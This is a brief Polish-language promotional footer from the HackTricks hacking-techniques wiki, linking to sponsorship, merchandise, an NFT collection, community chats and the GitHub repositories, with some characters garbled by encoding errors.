* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
